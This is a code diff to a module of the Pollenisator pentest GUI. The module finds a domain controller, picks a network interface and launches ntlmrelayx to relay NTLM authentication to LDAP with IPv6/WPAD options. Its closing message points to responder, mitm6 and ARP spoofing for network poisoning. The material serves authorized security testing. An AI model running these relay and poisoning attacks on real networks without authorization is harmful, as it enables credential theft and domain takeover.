@@ -1,16 +1,8 @@
-import multiprocessing
 import subprocess
 import psutil
-from pollenisatorgui.core.components.logger_config import logger
-import pollenisatorgui.core.components.utils as utils
-from pollenisatorgui.core.application.dialogs.ChildDialogQuestion import ChildDialogQuestion
-from pollenisatorgui.core.application.dialogs.ChildDialogCombo import ChildDialogCombo
-import tempfile
 import os
-import shutil
-import tkinter as tk
 from pollenisatorgui.core.components.apiclient import APIClient
-from pollenisatorgui.scripts.lan.utils import checkPath, findDc
+from pollenisatorgui.scripts.lan.utils import checkPath, findDc, getNICs
 
 
 def main(apiclient, appli, **kwargs):
@@ -21,14 +13,19 @@ def main(apiclient, appli, **kwargs):
     res, dc = findDc(apiclient, graphical=appli is not None)
     if not res:
         return False, dc
-    addrs = psutil.net_if_addrs()
-    dialog = ChildDialogCombo(None, addrs.keys(), displayMsg="Choose your ethernet device to listen on")
-    dialog.app.wait_window(dialog.app)
-    if dialog.rvalue is None:
+    try:
+        device = getNICs(appli is not None)
+    except ValueError as e:
+        return False, str(e)
+    if device is None or device.strip() == "":
         return False, "No ethernet device chosen"
-    my_ip = addrs[dialog.rvalue][0].address
+    addrs = psutil.net_if_addrs()
+    my_ip = addrs[device][0].address
     cmd = f"{path} -t ldap://{dc} -smb2support -wh {my_ip} -6" 
     if os.geteuid() != 0:
         cmd = "sudo "+cmd
-    appli.launch_in_terminal(kwargs.get("default_target",None), "ntlmrelayx to ldapr", cmd, use_pollex=False)
+    if appli:
+        appli.launch_in_terminal(kwargs.get("default_target",None), "ntlmrelayx to ldapr", cmd, use_pollex=False)
+    else:
+        subprocess.run(cmd, shell=True)
     return True, f"Relaying is set up, poison the network using responder, mitm6, arp spoofing, etc."
